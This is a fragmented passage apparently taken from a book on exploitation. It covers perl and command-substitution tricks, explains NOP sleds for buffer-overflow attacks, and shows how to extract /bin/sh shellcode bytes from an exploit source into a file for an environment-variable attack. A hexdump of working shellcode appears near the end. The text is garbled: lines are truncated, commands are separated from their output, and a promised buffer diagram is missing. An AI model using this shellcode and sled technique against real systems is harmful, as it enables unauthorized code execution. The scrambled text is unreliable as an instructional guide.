perl -e 'print "A" x 20;'

reader@hacking:~/booksrc $ perl -e 'print "A"x20 . "BCD" . "\x61\x66\x67\x69"x2 . "Z";'
AAAAAAAAAAAAAAAAAAAABCDafgiafgiZ

An entire shell command can be executed like a function, returning its
output in place. This is done by surrounding the command with parentheses
and prefixing a dollar sign. Here are two examples:
reader@hacking:~/booksrc $ $(perl -e 'print "uname";')
Linux
reader@hacking:~/booksrc $ una$(perl -e 'print "m";')e

NOP is an
assembly instruction that is short for no operation. It is a single-byte instruction
that does absolutely nothing. These instructions are sometimes used to waste
computational cycles for timing purposes and are actually necessary in the
Sparc processor architecture, due to instruction pipelining. In this case, NOP
instructions are going to be used for a different purpose: as a fudge factor.
We’ll create a large array (or sled) of these NOP instructions and place it
before the shellcode; then, if the EIP register points to any address found in
the NOP sled, it will increment while executing each NOP instruction, one at
a time, until it finally reaches the shellcode. This means that as long as the
return address is overwritten with any address found in the NOP sled, the EIP
register will slide down the sled to the shellcode, which will execute properly.
On the x86 architecture, the NOP instruction is equivalent to the hex byte
0x90. This means our completed exploit buffer looks something like this:






The seq command is a simple
program that generates sequences of numbers, which is typically used with
looping.
eader@hacking:~/booksrc $ seq 1 10
1
2
3
4
5
6
7
8
9
10
reader@hacking:~/booksrc $ seq 1 3 10
1
4
7
10
reader@hacking:~/booksrc $


head , grep , and cut can be used to isolate just
the hex-expanded bytes of the shellcode.


nes that begin with a quotation mark. This isolates the lines containing
the shellcode, which are then piped into cut using options to display only the
bytes between two quotation marks.
BASH’s for loop can actually be used to send each of these lines to an
echo command, with command-line options to recognize hex expansion and
to suppress adding a newline character to the end.
reader@hacking:~/booksrc
> do
> echo -en $i
> done > shellcode.bin
reader@hacking:~/booksrc
00000000 31 c0 31 db 31
00000010 2f 2f 73 68 68
00000020 e1 cd 80
00000023
reader@hacking:~/booksrc
$ for i in $(head exploit_notesearch.c | grep "^\"" | cut -d\" -f2)
$ hexdump -C shellcode.bin
c9 99 b0 a4 cd 80 6a 0b 58 51 68
2f 62 69 6e 89 e3 51 89 e2 53 89
|1.1.1......j.XQh|
|//shh/bin..Q..S.|
|...|
$
Now we have the shellcode in a file called shellcode.bin. This can be used
with command substitution to put shellcode into an environment variable,
along with a generous NOP sled.
